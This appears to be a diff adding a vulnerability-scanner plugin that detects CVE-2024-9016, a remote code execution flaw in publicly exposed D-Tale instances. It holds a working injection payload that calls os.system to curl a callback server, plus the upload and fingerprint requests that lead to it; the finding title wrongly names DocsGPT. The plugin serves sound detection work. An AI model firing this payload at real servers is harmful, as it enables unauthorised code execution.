@@ -1,0 +1,122 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Dtale_CVE_2024_9016"
+  author: "VickyTheViking"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2024-9016"
+  }
+  severity: CRITICAL
+  title: "Remote code execution affecting DocsGPT (CVE-2024-9016)"
+  description: "D-Tale is a visualizer for Pandas data structures. Users hosting D-Tale publicly can be vulnerable to remote code execution allowing attackers to run malicious code on the server."
+  recommendation: "Enable Authentication in the application to prevent unauthorized access."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2024-9016"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_dtale"
+  http_request: {
+    method: GET
+    uri: "/dtale/popup/upload"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "<title>My App - Load Data</title>" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "create_sample_table"
+  http_request: {
+    method: POST
+    uri: "/dtale/upload"
+    headers: [
+      { name: "Content-Type" value: "multipart/form-data; boundary=----geckoformboundaryb38fffc548bd5dad82328985c3f223d4" }
+    ]
+    data: '------geckoformboundaryb38fffc548bd5dad82328985c3f223d4\r\nContent-Disposition: form-data; name="simple-dtale-data.csv"; filename="simple-dtale-data.csv"\r\nContent-Type: text/csv\r\n\r\n------geckoformboundaryb38fffc548bd5dad82328985c3f223d4\r\nContent-Disposition: form-data; name="header"\r\n\r\ntrue\r\n------geckoformboundaryb38fffc548bd5dad82328985c3f223d4\r\nContent-Disposition: form-data; name="separatorType"\r\n\r\ncomma\r\n------geckoformboundaryb38fffc548bd5dad82328985c3f223d4\r\nContent-Disposition: form-data; name="separator"\r\n\r\n\r\n------geckoformboundaryb38fffc548bd5dad82328985c3f223d4--\r\n'
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"data_id\":" },
+          { body: {} contains: "\"success\":" }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"data_id\":\"([0-9_]+)\""
+            variable_name: "dataid"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "trigger_code_execution"
+  http_request: {
+    method: GET
+    uri: "/dtale/chart-data/{{ dataid }}?query=%40pd.core.frame.com.builtins.__import__%28%22os%22%29.system%28%22%22%22curl%20{{ T_CBS_URI }}%20%23%22%22%22%29"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"error\":\"" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_dtale",
+    "create_sample_table",
+    "trigger_code_execution",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
